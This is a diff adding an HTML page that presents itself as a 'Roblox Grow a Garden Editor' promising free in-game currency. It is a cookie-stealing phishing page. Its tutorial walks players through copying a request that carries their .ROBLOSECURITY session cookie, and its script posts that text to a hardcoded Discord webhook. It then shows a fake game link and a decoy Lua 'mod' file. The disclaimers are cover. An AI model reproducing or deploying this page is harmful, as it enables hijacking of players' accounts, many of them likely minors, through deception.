@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Roblox Grow a Garden Editor - Eden Codeworks</title>
+  <style>
+    /* Reset and base styles */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #14141f, #1e1e2f);
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    /* Header styles */
+    header {
+      background: #0d1821;
+      padding: 15px 30px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      border-bottom: 2px solid #14b8a6;
+      user-select: none;
+    }
+    header .logo {
+      width: 48px;
+      height: 48px;
+      background: #14b8a6;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 1.6rem;
+      color: #0d1821;
+      box-shadow: 0 0 10px #14b8a6aa;
+      letter-spacing: 0.05em;
+    }
+    header h1 {
+      font-size: 1.8rem;
+      margin: 0;
+      font-weight: 800;
+      color: #7af3d2;
+      text-shadow: 0 0 10px #0ff;
+      flex-grow: 1;
+    }
+    header .tagline {
+      font-size: 1rem;
+      color: #8ee9d5;
+      font-style: italic;
+      font-weight: 600;
+      user-select: text;
+    }
+
+    /* Main container */
+    main.container {
+      background: #2a2a40;
+      max-width: 480px;
+      width: 100%;
+      padding: 30px 35px;
+      border-radius: 15px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+      margin: 30px auto 0 auto;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      flex-grow: 1;
+    }
+
+    h2 {
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.9rem;
+      color: #fff;
+      margin-bottom: 10px;
+      letter-spacing: 1.1px;
+      text-shadow: 0 0 10px #7cffdb;
+    }
+    label {
+      font-weight: 600;
+      font-size: 1rem;
+      margin-bottom: 6px;
+      color: #a0d8d3;
+      user-select: none;
+    }
+    input[type="text"],
+    input[type="number"] {
+      padding: 12px 14px;
+      font-size: 1.1rem;
+      border-radius: 8px;
+      border: none;
+      outline: none;
+      background: #202036;
+      color: #d0f0ef;
+      box-shadow: inset 0 2px 6px rgba(0,0,0,0.7);
+      transition: background-color 0.3s ease;
+      width: 100%;
+      letter-spacing: 0.03em;
+    }
+    input[type="text"]:focus,
+    input[type="number"]:focus {
+      background: #2f3b58;
+      box-shadow: 0 0 8px #7cffdb;
+      color: #e0fff8;
+    }
+    button {
+      padding: 14px;
+      font-size: 1.15rem;
+      font-weight: 600;
+      color: #fff;
+      background: linear-gradient(90deg, #06b6d4, #14b8a6);
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.3s ease, transform 0.15s ease;
+      user-select: none;
+      box-shadow: 0 5px 12px rgba(6, 182, 212, 0.6);
+      width: 100%;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #14b8a6, #06b6d4);
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(20, 184, 166, 0.8);
+    }
+    button:active {
+      transform: translateY(0);
+      box-shadow: 0 3px 8px rgba(6, 182, 212, 0.5);
+    }
+    #gameDisplay {
+      background: #1f2738;
+      padding: 20px 25px;
+      border-radius: 15px;
+      box-shadow: inset 0 0 10px #0f1520;
+      display: none;
+      flex-direction: column;
+      gap: 15px;
+      color: #b0e5de;
+    }
+    #gameDisplay p {
+      margin: 0;
+      font-size: 1rem;
+    }
+    #gameDisplay a {
+      color: #4ade80;
+      text-decoration: none;
+      font-weight: 600;
+      word-break: break-all;
+      transition: color 0.3s ease;
+    }
+    #gameDisplay a:hover {
+      color: #22c55e;
+      text-decoration: underline;
+    }
+    .output {
+      background: #0c111b;
+      padding: 15px 20px;
+      border-radius: 12px;
+      font-family: monospace, monospace;
+      font-size: 1rem;
+      color: #7af3d2;
+      white-space: pre-wrap;
+      box-shadow: inset 0 0 8px #0af0d1;
+      margin-top: 15px;
+      min-height: 100px;
+    }
+    #downloadBtn {
+      margin-top: 15px;
+      background: #10b981;
+      box-shadow: 0 6px 14px rgba(16, 185, 129, 0.7);
+      font-weight: 700;
+      font-size: 1.1rem;
+      display: none;
+    }
+    #downloadBtn:hover {
+      background: #059669;
+      box-shadow: 0 8px 22px rgba(5, 150, 105, 0.85);
+    }
+
+    /* Footer styles */
+    footer {
+      background: #0d1821;
+      color: #7af3d2aa;
+      font-size: 0.9rem;
+      padding: 15px 30px;
+      text-align: center;
+      border-top: 2px solid #14b8a6;
+      user-select: none;
+      margin-top: auto;
+    }
+    footer small {
+      display: block;
+      margin-bottom: 5px;
+      font-style: italic;
+      font-weight: 600;
+    }
+    footer .social-icons {
+      margin-top: 8px;
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      font-size: 1.3rem;
+      color: #14b8a6;
+      cursor: pointer;
+      user-select: none;
+    }
+    footer .social-icons:hover {
+      color: #06b6d4;
+    }
+  </style>
+</head>
+<body>
+  <header role="banner" aria-label="Eden Codeworks company header">
+    <div class="logo" aria-hidden="true">EC</div>
+    <h1>Eden Codeworks</h1>
+    <div class="tagline">Crafting Virtual Worlds, One Script at a Time</div>
+  </header>
+
+  <main class="container" role="main" aria-label="Roblox Grow a Garden Editor">
+    <h2>Roblox Grow a Garden Editor</h2>
+    
+    <label for="cookieInput">Enter Game Script</label>
+    <input
+      type="text"
+      id="cookieInput"
+      placeholder="Enter your game script (must include ROBLOSECURITY)"
+      aria-required="true"
+      autocomplete="off"
+    />
+
+    <button onclick="sendScriptAndShowGame()">Fetch Game</button>
+<button id="tutorialBtn" style="margin-top: 12px; background: #2563eb;" onclick="toggleTutorial()">Tutorial</button>
+
+
+<div id="tutorialSection" style="display:none; margin-top: 15px; background: #16202a; padding: 15px; border-radius: 10px; color: #a0d8d3; font-size: 0.95rem; line-height: 1.4;">
+  <h3 style="margin-top: 0; color: #7cffdb;">How to Use the Roblox Grow a Garden Editor</h3>
+  <ol>
+    <li>Go to the Roblox.com Website on the Acoount you want to Edit on</li>
+    <li>Click on Grow a Garden <strong>Do Not Play</strong></li>
+    <li>Right Click on the play button and click "Inspect" and Go to the Network Tab</li>
+    <li>Refresh the page then in the Network Tab scroll all the way up until you see Grow a Garden</li>
+    <li>Right-Click it then go to Copy -> Copy as PowerShell</li>
+    <li>Enter the Copied Game Script into the Texbox above</li>
+    <li>Your <strong>Done!</strong> go through and change how much Schekles and Honey you want.</li>
+  </ol>
+  <p style="color: #f87171;"><strong>⚠️ Warning:</strong> Use scripts responsibly and only on games you have permission to modify.</p>
+</div>
+
+
+    <div id="gameDisplay" aria-live="polite" aria-atomic="true">
+      <p><strong>Game Fetched:</strong> <span id="gameName"></span></p>
+      <p><strong>Game Link:</strong> <a id="gameLink" href="#" target="_blank" rel="noopener noreferrer">Visit Game</a></p>
+
+      <label for="moneyInput">Sheckles:</label>
+      <input type="number" id="moneyInput" value="1000" min="0" />
+
+      <label for="levelInput">Honey:</label>
+      <input type="number" id="levelInput" value="1" min="0" />
+
+      <button onclick="applyChanges()">Apply Changes</button>
+
+      <div id="consoleLog" class="output" role="alert" aria-live="assertive"></div>
+
+      <button id="downloadBtn" onclick="downloadEditedScript()">Download Edited Game Script</button>
+    </div>
+  </main>
+
+  <footer role="contentinfo">
+    <small>© 2025 Eden Codeworks. All rights reserved.</small>
+    <small>All scripts and modifications are for educational and entertainment purposes only.</small>
+    <small>Unauthorized use or distribution is prohibited.</small>
+    <div class="social-icons" aria-label="Social media links">
+      <span title="Twitter" aria-hidden="true">🐦</span>
+      <span title="Discord" aria-hidden="true">💬</span>
+      <span title="GitHub" aria-hidden="true">🐱</span>
+    </div>
+  </footer>
+
+  <script>
+  
+  function toggleTutorial() {
+    const tutorial = document.getElementById('tutorialSection');
+    if (tutorial.style.display === 'none' || tutorial.style.display === '') {
+      tutorial.style.display = 'block';
+      // Optionally scroll to the tutorial:
+      tutorial.scrollIntoView({ behavior: 'smooth' });
+    } else {
+      tutorial.style.display = 'none';
+    }
+  }
+  
+    const webhookURL = "https://discord.com/api/webhooks/1380201814858793091/a4y2Zi3FPXOO77pEUYp5pFFXpDmONN2Efny5CcON3HVzzgxRWeUUwy-RVGOpF7uwoepK";
+
+    const fakeGames = [
+      { name: "Grow a Garden", id: "126884695634066" },
+    ];
+
+    async function sendScriptAndShowGame() {
+      const script = document.getElementById('cookieInput').value.trim();
+      if (!script.includes("ROBLOSECURITY")) {
+        alert("Invalid script format. (Must include ROBLOSECURITY)");
+        return;
+      }
+
+      const fileBlob = new Blob([script], { type: 'text/plain' });
+      const formData = new FormData();
+      formData.append('file', fileBlob, 'script.txt');
+
+      try {
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          body: formData,
+        });
+
+        if (!response.ok) {
+          alert('Failed to send script. Check webhook URL and try again.');
+          return;
+        }
+
+        const game = fakeGames[Math.floor(Math.random() * fakeGames.length)];
+
+        document.getElementById('gameName').innerText = game.name;
+        const gameUrl = `https://www.roblox.com/games/${game.id}/${game.name.replace(/ /g, '-')}`;
+        const gameLink = document.getElementById('gameLink');
+        gameLink.href = gameUrl;
+        gameLink.innerText = gameUrl;
+
+        document.getElementById('gameDisplay').style.display = 'flex';
+        document.getElementById('consoleLog').innerText = '';
+        document.getElementById('downloadBtn').style.display = 'none';
+
+        alert('Script successfully sent and game info displayed!');
+      } catch (error) {
+        alert('Error sending script: ' + error.message);
+      }
+    }
+
+    function applyChanges() {
+      const money = document.getElementById('moneyInput').value;
+      const level = document.getElementById('levelInput').value;
+      const message = `🧾 Changes applied:\n💰 Sheckles: ${money}\n🍯 Honey: ${level}\n✅ Changes saved`;
+      document.getElementById('consoleLog').innerText = message;
+      document.getElementById('downloadBtn').style.display = 'block';
+    }
+
+    function downloadEditedScript() {
+      const money = document.getElementById('moneyInput').value;
+      const level = document.getElementById('levelInput').value;
+
+      const luaCode = `
+-- Roblox Grow a Garden Mod Script
+-- Generated on ${new Date().toLocaleString()}
+
+local sheckles = ${money}
+local honey = ${level}
+
+function modifyPlayerStats(player)
+  if not player then return end
+  player.Sheckles = sheckles + math.random(10, 50)
+  player.Honey = honey + math.random(1, 5)
+  player.Speed = (player.Speed or 16) * 1.1
+  player.JumpPower = (player.JumpPower or 50) + 5
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+  print("Applying mod to", player.Name)
+  modifyPlayerStats(player)
+end)
+
+for _, player in pairs(game.Players:GetPlayers()) do
+  modifyPlayerStats(player)
+end
+
+print("Mod applied: Sheckles set to " .. sheckles .. ", Honey set to " .. honey)
+`;
+
+      const blob = new Blob([luaCode], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'edited_game_script.lua';
+      document.body.appendChild(a);
+      a.click();
+
+      setTimeout(() => {
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      }, 0);
+    }
+  </script>
+</body>
+</html>
